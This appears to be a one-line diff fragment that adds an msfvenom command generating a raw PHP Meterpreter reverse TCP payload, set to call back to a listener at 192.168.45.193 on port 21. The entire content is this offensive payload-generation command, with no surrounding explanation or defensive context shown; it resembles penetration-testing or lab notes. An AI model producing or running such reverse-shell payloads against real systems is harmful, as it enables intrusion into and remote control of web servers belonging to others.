@@ -1,0 +1,1 @@
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.45.193 lport=21 -f raw
